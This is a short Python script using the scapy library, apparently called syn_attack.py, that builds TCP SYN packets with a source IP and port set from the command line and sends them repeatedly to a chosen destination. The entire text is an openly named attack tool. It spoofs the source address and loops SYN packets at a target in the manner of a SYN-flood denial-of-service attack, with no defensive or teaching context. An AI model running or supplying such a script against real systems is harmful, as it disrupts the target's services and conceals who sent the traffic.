from scapy.all import *
import sys

def main():
    if len(sys.argv) != 5:
        print 'Usage: python syn_attack.py src_IP src_port dst_IP dst_port'
        sys.exit(1)
    ip = IP()
    tcp = TCP()

    ip.src = sys.argv[1]
    tcp.sport = int(sys.argv[2])
    tcp.flags = 'S'

    ip.dst = sys.argv[3]
    tcp.dport = int(sys.argv[4])

    ans, unans = srloop(ip/tcp, inter=0.3, retry=2, timeout=60)

if __name__ == '__main__':
    main()
